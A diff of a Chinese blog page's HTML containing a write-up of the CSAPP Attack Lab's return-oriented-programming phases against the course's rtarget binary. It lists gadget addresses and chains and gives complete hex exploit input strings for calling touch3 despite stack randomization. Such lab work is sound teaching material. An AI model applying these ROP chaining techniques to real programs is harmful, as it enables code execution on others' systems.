+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">c3</span> <span class="o">&lt;</span><span class="n">setval_426</span><span class="o">&gt;:</span>
 </span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">c3</span><span class="p">:</span>       <span class="n">c7</span> <span class="mo">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">c7</span> <span class="mi">90</span>       <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x90c78948</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">c9</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>得到指令地址为<code>0x4019c5</code></p>
+</span></span></code></pre></div><p>得到指令地址为<code>0x4019c5</code></p>
 <p>根据上图的栈帧，就能写出输入序列：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
@@ -923,42 +706,16 @@
 </span></span><span class="line"><span class="cl">fa 97 b9 59 00 00 00 00
 </span></span><span class="line"><span class="cl">c5 19 40 00 00 00 00 00
 </span></span><span class="line"><span class="cl">ec 17 40 00 00 00 00 00
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="level2">level2
+</span></span></code></pre></div><h3 id="level2">level2
 </h3><p>来自官方的劝退哈哈哈，Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p>
 <p>这道题主要是在rtarget中返回到touch3，看似没有难度</p>
 <p><code>Phase 3</code>中用到的注入代码为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
 </span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4018fa</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>其中<code>0x5561dca8</code>是栈中<code>cookie</code>存放的地址。</p>
+</span></span></code></pre></div><p>其中<code>0x5561dca8</code>是栈中<code>cookie</code>存放的地址。</p>
 <p>在本题中由于栈随机化，不能直接将<code>0x5561dca8</code>地址直接给%rdi，可以利用%rsp的相对偏移量来获取cookie的存放地址，</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">movq   $0x30(%rsp), %rdi
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">movq   $0x30(%rsp), %rdi
 </span></span><span class="line"><span class="cl">movq   %rsp, %rax
 </span></span><span class="line"><span class="cl">movq   %rax, %rdi
 </span></span><span class="line"><span class="cl">lea    (%rdi,%rsi,1),%rax
@@ -969,45 +726,18 @@
 </span></span><span class="line"><span class="cl">movl   %ecx, %esi
 </span></span><span class="line"><span class="cl">pushq   $0x4018fa
 </span></span><span class="line"><span class="cl">ret
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>查表，<code>movq %rsp, xxx</code>表示为<code>48 89 xx</code>，查找一下有没有可用的<code>gadget</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="n">aab</span> <span class="o">&lt;</span><span class="n">setval_350</span><span class="o">&gt;:</span>
+</span></span></code></pre></div><p>查表，<code>movq %rsp, xxx</code>表示为<code>48 89 xx</code>，查找一下有没有可用的<code>gadget</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="n">aab</span> <span class="o">&lt;</span><span class="n">setval_350</span><span class="o">&gt;:</span>
 </span></span><span class="line"><span class="cl">  <span class="mi">401</span><span class="nl">aab</span><span class="p">:</span>       <span class="n">c7</span> <span class="mo">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">e0</span> <span class="mi">90</span>       <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x90e08948</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="mi">401</span><span class="nl">ab1</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>还真找到了，<code>48 89 e0</code>对应的汇编代码为</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>地址为：<code>0x401aad</code></p>
+</span></span></code></pre></div><p>还真找到了，<code>48 89 e0</code>对应的汇编代码为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>
+</span></span></code></pre></div><p>地址为：<code>0x401aad</code></p>
 <p>根据提示，有一个<code>gadget</code>一定要用上</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">d6</span> <span class="o">&lt;</span><span class="n">add_xy</span><span class="o">&gt;:</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">d6</span> <span class="o">&lt;</span><span class="n">add_xy</span><span class="o">&gt;:</span>
 </span></span><span class="line"><span class="cl">   <span class="mi">4019</span><span class="nl">d6</span><span class="p">:</span>       <span class="mi">48</span> <span class="mi">8</span><span class="n">d</span> <span class="mo">04</span> <span class="mi">37</span>             <span class="nf">lea</span>    <span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="n">rax</span>
 </span></span><span class="line"><span class="cl">   <span class="mi">4019</span><span class="nl">da</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>地址为：<code>0x4019d6</code></p>
+</span></span></code></pre></div><p>地址为：<code>0x4019d6</code></p>
 <p>通过合适的赋值，这段代码就能实现<code>%rsp</code>加上段内偏移地址来确定<code>cookie</code>的位置</p>
 <p>剩下部分流程与<code>Phase 3</code>一致，大体思路如下：</p>
 <ul>
@@ -1018,42 +748,7 @@
 <li>调用<code>touch 3</code></li>
 </ul>
 <p>由于<code>gadget</code>的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，直接给出代码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#地址：0x401aad
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#地址：0x401aad
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
 </span></span><span class="line"><span class="cl">
@@ -1084,22 +779,11 @@
 </span></span><span class="line"><span class="cl"><span class="cp">#地址：0x4019a2
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
 </span></span><span class="line"><span class="cl"><span class="n">ret</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>注意movl %ecx, %esi这条指令对应89 d1，截取下面部分</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0000000000401a6e &lt;setval_167&gt;:
+</span></span></code></pre></div><p>注意movl %ecx, %esi这条指令对应89 d1，截取下面部分</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0000000000401a6e &lt;setval_167&gt;:
 </span></span><span class="line"><span class="cl">  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
 </span></span><span class="line"><span class="cl">  401a74:	c3   
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>按理说后面是91不是90(nop)，所以不能取，但在x86汇编中，0x91 表示 xchg eax, ecx 指令。这条指令的作用是交换 %eax 和 %ecx 寄存器的值。不影响寄存器的值，所以可以。</p>
+</span></span></code></pre></div><p>按理说后面是91不是90(nop)，所以不能取，但在x86汇编中，0x91 表示 xchg eax, ecx 指令。这条指令的作用是交换 %eax 和 %ecx 寄存器的值。不影响寄存器的值，所以可以。</p>
 <h3 id="栈帧讲解-1">栈帧讲解
 </h3><p>为节省空间，每一行代码都省略了后面的<code>ret</code>，<img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w.webp"
 	width="1132"
@@ -1119,27 +803,7 @@
 <p><strong>要注意</strong>，<code>getbuf</code>执行<code>ret</code>后相当于进行了一次<code>pop</code>操作，<code>test</code>的栈顶指针<code>%rsp=%rsp+0x8</code>，所以<code>cookie</code>相对于此时栈顶指针的偏移量是<code>0x48</code>而不是<code>0x50</code></p>
 <h3 id="solution-2">Solution
 </h3><p>根据上图的栈帧，写出输入序列：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
 </span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
@@ -1155,9 +819,7 @@
 </span></span><span class="line"><span class="cl">a2 19 40 00 00 00 00 00 
 </span></span><span class="line"><span class="cl">fa 18 40 00 00 00 00 00 
 </span></span><span class="line"><span class="cl">35 39 62 39 39 37 66 61
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
+</span></span></code></pre></div>
 </section>
 
 
